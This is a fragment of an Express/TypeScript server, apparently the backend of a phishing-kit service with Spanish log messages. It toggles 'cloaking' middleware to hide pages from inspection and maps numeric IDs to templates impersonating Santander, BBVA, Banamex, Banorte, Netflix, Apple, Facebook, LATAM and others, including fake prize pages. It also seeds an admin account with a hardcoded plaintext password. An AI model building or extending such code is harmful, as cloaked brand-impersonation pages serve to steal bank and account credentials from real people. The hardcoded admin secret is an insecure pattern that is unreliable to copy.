      console.log(`[CLOAKING] Estado cambiado a: ${enabled ? 'ACTIVADO' : 'DESACTIVADO'}`);
      res.json({ enabled: cloakingEnabled });
    } else {
      res.status(400).json({ error: "Valor 'enabled' debe ser boolean" });
    }
  });

  // Función para obtener estado del cloaking (exportada para middleware)
  (global as any).getCloakingStatus = () => cloakingEnabled;

  // Cloaking middleware for all template routes
  // This must be BEFORE the catch-all Vite middleware to intercept template routes
  // Template access with cloaking protection
  app.get("/template/:templateName", templateCloakingMiddleware, validateSessionMiddleware, (req, res, next) => {
    // If we reach here, the user passed the cloaking check and has a valid session
    // Let Vite handle the React Router
    next();
  });

  // Additional specific template routes for completeness
  // Template access via user ID and numeric ID with cloaking protection
  app.get("/:userId/:numericId", templateCloakingMiddleware, (req, res, next) => {
    // Template access via user ID and numeric ID format
    const numericId = req.params.numericId;
    
    // Map numeric IDs to template names for cloaking
    const numericToTemplate: { [key: string]: string } = {
      '1': 'santander',
      '2': 'bbva', 
      '3': 'banamex',
      '4': 'netflix',
      '5': 'apple',
      '6': 'liverpool',
      '7': 'actas',
      '8': 'bbva-premios',
      '9': 'banorte-premios',
      '10': 'santander-premios',
      '11': 'sixflags',
      '12': 'latam',
      '13': 'facebook'
    };

    req.params.templateName = numericToTemplate[numericId] || 'unknown';
    next();
  });

  return httpServer;
}

// Initialize admin user on startup
async function initializeAdmin() {
  try {
    const bcrypt = await import("bcrypt");
    const adminPassword = "olY0HobCdb71A401O5dqRV&;J";
    
    const adminUser = await storage.getUserByUsername("nemesisdev");
    if (!adminUser) {
      console.log("Creating admin user...");
      // Hash password before creating user
      const hashedPassword = await bcrypt.hash(adminPassword, 12);
      
      await storage.createUser({
        username: "nemesisdev",
        password: hashedPassword, // Store hashed password
        email: "admin@nemesis.dev",
        role: "admin",
        membershipType: null,
        membershipStartDate: null,
        membershipEndDate: null,
        isActive: true
      });
      console.log("Admin user created successfully with hashed password");
    } else {
      // Check if password needs to be hashed (migration support)
      const isHashed = adminUser.password.startsWith('$2b$') || adminUser.password.startsWith('$2a$');
      
      if (!isHashed) {
        console.log("Admin user exists but password is not hashed, updating...");
        await storage.updateUserPassword("nemesisdev", adminPassword); // This now hashes automatically
        console.log("Admin password hashed and updated successfully");
      } else {
        console.log("Admin user already exists with hashed password");
      }
    }
  } catch (error) {
    console.error("Failed to initialize admin user:", error);
  }
}
